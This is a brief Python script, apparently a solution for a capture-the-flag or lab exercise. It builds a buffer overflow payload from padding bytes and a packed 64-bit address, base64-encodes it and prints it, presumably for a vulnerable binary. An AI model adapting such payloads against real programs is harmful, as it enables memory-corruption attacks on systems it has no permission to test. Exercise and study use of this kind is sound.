
import sys
import struct
import base64

buf = b'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'
buf += struct.pack('<Q', 12169718843276696356)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
